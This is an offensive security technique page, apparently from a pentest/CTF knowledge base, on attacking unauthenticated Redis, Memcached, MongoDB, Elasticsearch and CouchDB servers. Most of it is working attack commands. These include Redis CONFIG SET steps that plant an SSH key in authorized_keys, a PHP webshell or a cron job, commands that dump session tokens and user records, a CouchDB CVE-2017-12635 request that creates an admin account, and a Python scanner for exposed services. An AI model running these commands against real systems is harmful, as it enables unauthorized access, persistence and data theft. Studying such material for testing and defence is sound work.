---
title: "Exposed Data Services - Redis, Memcached, MongoDB, Elasticsearch, CouchDB"
category: misc
subcategory: network-services
type: technique
tags: [redis, memcached, mongodb, elasticsearch, couchdb, nosql, redis-cli, unauthenticated, rce, config-set, no-auth, enumeration, network-services, exposed-service]
difficulty: medium
summary: "Data stores that ship without auth: Redis writes SSH keys/webshells, Mongo/Elastic/CouchDB dump data anonymously, and several have documented RCE paths."
when_to_use:
  - "One of 6379, 11211, 27017, 9200/9300, 5984 is open"
  - "A service answers without asking for credentials"
  - "You can write to Redis and the box exposes SSH or a web root"
  - "You need to dump application data or find a version-gated RCE"
cves: [CVE-2015-1427, CVE-2017-12635, CVE-2017-12636]
tools: [redis-cli, mongosh, curl, memcstat, nmap]
related: [svc-cve-exploitation-workflow, svc-admin-interfaces-rce, net-scanning-fingerprinting]
---

## TL;DR

These services default to *no authentication*. Redis at 6379 is the most dangerous: with write
access you can plant an SSH key, cron job or webshell. Memcached, MongoDB, Elasticsearch and
CouchDB hand over their data to anonymous clients, and several have documented RCE paths on
specific versions.

## Recognise it

- `6379/tcp redis`, `11211/tcp memcached`, `27017/tcp mongodb`, `9200/tcp http (elastic)`,
  `5984/tcp httpd (couchdb)`.
- The banner or `INFO` output states the exact version -- match it to a CVE.

## Attack

### Redis (6379)

```bash
# Connect and check whether auth is required
redis-cli -h 10.10.10.5 ping
redis-cli -h 10.10.10.5 INFO server

# Dump keys and read values
redis-cli -h 10.10.10.5 KEYS '*'
redis-cli -h 10.10.10.5 GET somekey

# If requirepass is set, brute a short list
redis-cli -h 10.10.10.5 -a 'guess' ping

# Where does Redis write its RDB file?
redis-cli -h 10.10.10.5 CONFIG GET dir
redis-cli -h 10.10.10.5 CONFIG GET dbfilename
```

**Unauth write to SSH authorized_keys** (target's redis runs as a user with an ~/.ssh):

```bash
# Prepare a key with newline padding so it survives the RDB wrapper
(echo -e '\n\n'; cat ~/.ssh/id_rsa.pub; echo -e '\n\n') > key.txt

# Point Redis at the .ssh dir, name the file authorized_keys, load the key, save
redis-cli -h 10.10.10.5 CONFIG SET dir /home/redis/.ssh/
redis-cli -h 10.10.10.5 CONFIG SET dbfilename authorized_keys
redis-cli -h 10.10.10.5 -x SET payload < key.txt
redis-cli -h 10.10.10.5 SAVE
# Then: ssh -i ~/.ssh/id_rsa redis@10.10.10.5
```

Same technique writes a webshell into a web root (`CONFIG SET dir /var/www/html`,
`dbfilename shell.php`, `SET x "<?php system($_GET[0]);?>"`, `SAVE`) or a cron file into
`/var/spool/cron/crontabs/`.

Other RCE routes: `MODULE LOAD` (load a malicious `.so`), and master/replica replication RCE
against Redis 4.x/5.x (point the target at your rogue master which serves a module).

### Memcached (11211)

```bash
# Server stats and banner
memcstat --servers=10.10.10.5
echo -e 'stats\r\n' | nc -q1 10.10.10.5 11211

# List slab classes, then dump keys per slab, then GET them
printf 'stats items\r\n' | nc -q1 10.10.10.5 11211
printf 'stats cachedump 1 100\r\n' | nc -q1 10.10.10.5 11211
printf 'get sessionkey\r\n' | nc -q1 10.10.10.5 11211

# memcdump lists all keys
memcdump --servers=10.10.10.5
```

Session tokens and cached DB rows live here -- great for auth bypass.

### MongoDB (27017)

```bash
# Connect with no auth (default) and enumerate
mongosh "mongodb://10.10.10.5:27017" --eval 'db.adminCommand({listDatabases:1})'
mongosh "mongodb://10.10.10.5:27017/admin" --eval 'db.getMongo().getDBNames()'

# Enumerate collections and read documents in a db
mongosh "mongodb://10.10.10.5:27017/appdb" --eval 'db.getCollectionNames()'
mongosh "mongodb://10.10.10.5:27017/appdb" --eval 'db.users.find().pretty()'

# Old mongo client equivalent
mongo 10.10.10.5:27017/appdb --eval 'db.users.find()'
```

If the app is in front of Mongo, look for NoSQL injection (`{"$ne":null}`, `{"$gt":""}`) in login
forms rather than hitting the DB port directly.

### Elasticsearch (9200)

```bash
# Cluster health and version
curl -s http://10.10.10.5:9200/ | jq .

# List indices (where the data lives)
curl -s 'http://10.10.10.5:9200/_cat/indices?v'

# Dump documents from an index
curl -s 'http://10.10.10.5:9200/myindex/_search?pretty&size=100'

# Search for a term across everything
curl -s 'http://10.10.10.5:9200/_search?q=password&pretty'

# Snapshot repositories can expose file paths / data
curl -s 'http://10.10.10.5:9200/_snapshot/_all?pretty'
```

Version-gated RCE: Elasticsearch 1.x with dynamic scripting had a Groovy sandbox escape
(CVE-2015-1427) giving code execution via a crafted `_search` script -- only relevant if the banner
reports that ancient version.

### CouchDB (5984)

```bash
# Version and welcome
curl -s http://10.10.10.5:5984/

# List all databases
curl -s http://10.10.10.5:5984/_all_dbs

# Read a database's documents
curl -s http://10.10.10.5:5984/mydb/_all_docs?include_docs=true

# Fauxton web UI
# browse to http://10.10.10.5:5984/_utils/
```

Version-gated: CVE-2017-12635 (JSON parser role escalation -- create an admin user with a duplicate
`roles` key) chained with CVE-2017-12636 (config-based RCE via `query_servers`) on CouchDB < 1.7 / < 2.1.

```bash
# CVE-2017-12635: create an admin by exploiting the duplicate-key parser bug
curl -s -X PUT http://10.10.10.5:5984/_users/org.couchdb.user:hacker \
  -H 'Content-Type: application/json' \
  -d '{"type":"user","name":"hacker","password":"hacker","roles":["_admin"],"roles":[],"_id":"org.couchdb.user:hacker"}'
```

Only use these on a host whose version actually matches; verify the version first.

## Code

Multi-service exposure scanner -- reports which of these data services answer without auth on a host.

```python
#!/usr/bin/env python3
"""Probe a host for unauthenticated Redis/Memcached/Mongo/Elastic/CouchDB.

Usage:
    python3 datastore_probe.py 10.10.10.5
"""
from __future__ import annotations

import socket
import sys
from urllib.error import URLError
from urllib.request import urlopen

TIMEOUT = 4


def raw_probe(host: str, port: int, payload: bytes) -> str:
    """Send a payload to a TCP port and return the first chunk of the reply."""
    try:
        with socket.create_connection((host, port), timeout=TIMEOUT) as sock:
            if payload:
                sock.sendall(payload)
            sock.settimeout(TIMEOUT)
            return sock.recv(2048).decode("utf-8", "replace")
    except OSError:
        return ""


def http_probe(host: str, port: int, path: str) -> str:
    """GET an HTTP path and return the body (truncated)."""
    try:
        with urlopen(f"http://{host}:{port}{path}", timeout=TIMEOUT) as resp:
            return resp.read(2048).decode("utf-8", "replace")
    except (URLError, OSError):
        return ""


def check_redis(host: str) -> None:
    out = raw_probe(host, 6379, b"INFO server\r\n")
    if "redis_version" in out:
        ver = next((l.split(":", 1)[1].strip() for l in out.splitlines() if l.startswith("redis_version")), "?")
        print(f"[+] Redis 6379 UNAUTH  version={ver}")
    elif "NOAUTH" in out:
        print("[!] Redis 6379 present but requires a password")


def check_memcached(host: str) -> None:
    out = raw_probe(host, 11211, b"stats\r\n")
    if "STAT " in out:
        print("[+] Memcached 11211 UNAUTH (stats returned)")


def check_mongo(host: str) -> None:
    # Mongo speaks a binary wire protocol; a bare connect that stays open is a weak signal.
    try:
        with socket.create_connection((host, 27017), timeout=TIMEOUT):
            print("[?] MongoDB 27017 open -- verify with: mongosh mongodb://%s:27017" % host)
    except OSError:
        pass


def check_elastic(host: str) -> None:
    out = http_probe(host, 9200, "/")
    if "cluster_name" in out or '"lucene_version"' in out:
        print("[+] Elasticsearch 9200 UNAUTH")
        print("    ", http_probe(host, 9200, "/_cat/indices?v").splitlines()[:1])


def check_couch(host: str) -> None:
    out = http_probe(host, 5984, "/")
    if "couchdb" in out.lower():
        print("[+] CouchDB 5984 reachable")
        dbs = http_probe(host, 5984, "/_all_dbs")
        if dbs:
            print("     _all_dbs:", dbs.strip())


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print(__doc__)
        return 1
    host = argv[1]
    for check in (check_redis, check_memcached, check_mongo, check_elastic, check_couch):
        check(host)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **`protected-mode`** in modern Redis refuses external connections unless bound to 0.0.0.0 or a
  password is set -- if you can reach it from the network at all, it is misconfigured.
- **Redis write privesc needs a writable target dir** the redis process owns; check `CONFIG GET dir`
  first and pick a directory that user controls (its home, a web root, cron).
- **Padding the SSH key** with newlines matters -- the RDB header/footer corrupts unpadded keys.
- **Memcached needs `nc -q1`** or it hangs waiting for more input.
- **Mongo NoSQL injection** through the app is usually easier than the raw port; try both.
- **CVEs are version-gated.** The Groovy and CouchDB RCEs only work on the old versions named --
  confirm the banner before firing.
- **Do not destroy data.** `FLUSHALL`, dropping collections, or deleting indices can brick a shared
  CTF box for everyone. Read, do not wreck.

## Tools

- `redis-cli`, `mongosh`/`mongo`, `curl`+`jq`, `memcstat`/`memcdump`, `nc`.
- `nmap` NSE: `redis-info`, `mongodb-databases`, `couchdb-databases`, `http-elasticsearch-head`.

## References

- The official docs for each product (Redis `CONFIG`, Elasticsearch `_cat` and `_search` APIs).
- CVE-2015-1427 (Elasticsearch Groovy), CVE-2017-12635 and CVE-2017-12636 (CouchDB).
